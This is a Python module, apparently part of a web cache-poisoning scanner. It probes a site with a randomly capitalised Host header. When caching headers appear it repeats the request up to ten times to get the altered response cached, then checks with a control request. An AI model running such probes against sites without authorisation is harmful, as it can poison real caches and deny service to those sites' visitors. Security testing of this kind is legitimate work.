#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Attempts to find Cache Poisoning with Host Header Case Normalization (HHCN)
https://youst.in/posts/cache-key-normalization-denial-of-service/
"""

from modules.utils import random, requests, get_domain_from_url, configure_logger, Identify

logger = configure_logger(__name__)

VULN_NAME = "Host Header Case Normalization"

CONTENT_DELTA_RANGE = 500

def random_domain_capitalization(url):
    """Randomly capitalize characters from the url domain"""
    domain = get_domain_from_url(url)

    index = random.randint(0, len(domain) - 3)
    letter = domain[index]
    if letter != "." or letter != "-":
        letter = domain[index].upper()
    else:
        letter = letter - 1
        letter = domain[index].upper()
    domain = domain[:index] + letter + domain[index + 1 :]
    return domain


def HHCN(url, s, main_response, authent, content_delta_range=CONTENT_DELTA_RANGE):
    """Attempts to find Cache Poisoning with Host Header Case Normalization"""

    logger.debug("Testing for %s vulnerabilities", VULN_NAME)

    headers = {"Host": random_domain_capitalization(url)}
    payload = f"PAYLOAD: {headers}"

    try:
        main_response_size = len(main_response.content)

        probe = s.get(
            url,
            headers=headers,
            verify=False,
            timeout=10,
            auth=authent,
            allow_redirects=False,
        )
        probe_size = len(probe.content)
        behavior = ""
        if not (main_response_size - content_delta_range < probe_size < main_response_size + content_delta_range) or (main_response.status_code != probe.status_code):
            if len(probe.headers) > 0:
                for rf in probe.headers:
                    if "cache" in rf.lower() or "age" in rf.lower():
                        for _ in range(10):
                            req_hhcn_bis = s.get(
                                url,
                                headers=headers,
                                verify=False,
                                timeout=10,
                                auth=authent,
                                allow_redirects=False,
                            )
                    else:
                        req_hhcn_bis = s.get(
                                url,
                                headers=headers,
                                verify=False,
                                timeout=10,
                                auth=authent,
                                allow_redirects=False,
                            )
                        break;
            else:
                req_hhcn_bis = s.get(
                                url,
                                headers=headers,
                                verify=False,
                                timeout=10,
                                auth=authent,
                                allow_redirects=False,
                            )
            if not (
                main_response_size - content_delta_range
                < probe_size
                < main_response_size + content_delta_range
            ):
                behavior = (
                    f"DIFFERENT RESPONSE LENGTH | {main_response_size}b > {probe_size}b"
                )
                print(
                    f" {Identify.behavior} | HHCN | \033[34m{url}\033[0m | {behavior} | {payload}"
                )

            if main_response.status_code != probe.status_code:
                behavior = (
                    f"DIFFERENT STATUS-CODE | {main_response_size}b > {probe_size}b"
                )
                print(
                    f" {Identify.behavior} | HHCN | \033[34m{url}\033[0m | {behavior} | {payload}"
                )

            control = s.get(url, verify=False, timeout=10, auth=authent)

            if behavior and len(req_hhcn_bis.content) == len(control.content) and len(control.content) != main_response_size:
                behavior = f"DIFFERENT RESPONSE LENGTH | {main_response_size}b > {len(control.content)}b"
                print(
                    f" {Identify.confirmed} | HHCN | \033[34m{url}\033[0m | {behavior} | {payload}"
                )

            if behavior and req_hhcn_bis.status_code == control.status_code and control.status_code != main_response.status_code:
                behavior = f"DIFFERENT STATUS-CODE | {main_response.status_code} > {control.status_code}"
                print(
                    f" {Identify.confirmed} | HHCN | \033[34m{url}\033[0m | {behavior} | {payload}"
                )

        print(f" \033[34m {VULN_NAME} : {headers}\033[0m\r", end="")
        print("\033[K", end="")
    except requests.exceptions.ConnectionError as e:
        logger.exception(e)
